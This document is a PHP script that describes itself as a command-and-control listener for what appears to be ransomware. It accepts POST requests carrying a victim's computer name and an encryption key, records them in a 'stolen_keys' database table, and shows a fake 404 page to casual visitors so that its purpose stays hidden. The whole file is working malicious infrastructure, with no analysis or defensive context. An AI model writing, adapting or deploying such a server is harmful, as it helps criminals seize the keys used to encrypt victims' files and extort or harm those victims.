<?php
/**
 * receive.php
 * This script acts as the C2 listener. 
 */

// 1. Pull in the secret credentials securely
require_once 'config.php';

// 2. Establish Database Connection (using the variables from config.php)
$conn = new mysqli($servername, $username, $password, $dbname, $port);

// Terminate immediately if the database is unreachable
if ($conn->connect_error) {
    error_log("C2 Server Error: Database connection failed - " . $conn->connect_error);
    die("Connection failed");
}

// 3. Listen for incoming POST requests
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    
    // Safely capture the data sent by the Python script
    // We use the null coalescing operator (??) to prevent errors if a field is missing
    $pc_name = $_POST['pc_name'] ?? 'UNKNOWN_HOST';
    $key = $_POST['key'] ?? 'NO_KEY';

    // 4. Sanitize Input (Crucial for preventing SQL Injection against your own server!)
    $clean_pc_name = $conn->real_escape_string($pc_name);
    $clean_key = $conn->real_escape_string($key);

    // 5. Execute the Insert Query
    $sql = "INSERT INTO stolen_keys (pc_name, encryption_key) VALUES ('$clean_pc_name', '$clean_key')";

    if ($conn->query($sql) === TRUE) {
        // Echoing success is optional, but helps during testing
        echo "Exfiltration Successful.";
    } else {
        error_log("C2 Server Error: Failed to insert key - " . $conn->error);
        echo "Exfiltration Failed.";
    }
} else {
    // If someone visits this page in a browser (GET request), show nothing.
    // Real C2 servers often show a fake 404 page here to hide their true purpose.
    header("HTTP/1.0 404 Not Found");
    echo "<h1>404 Not Found</h1>";
    echo "The page that you have requested could not be found.";
}

// 6. Close the connection
$conn->close();
?>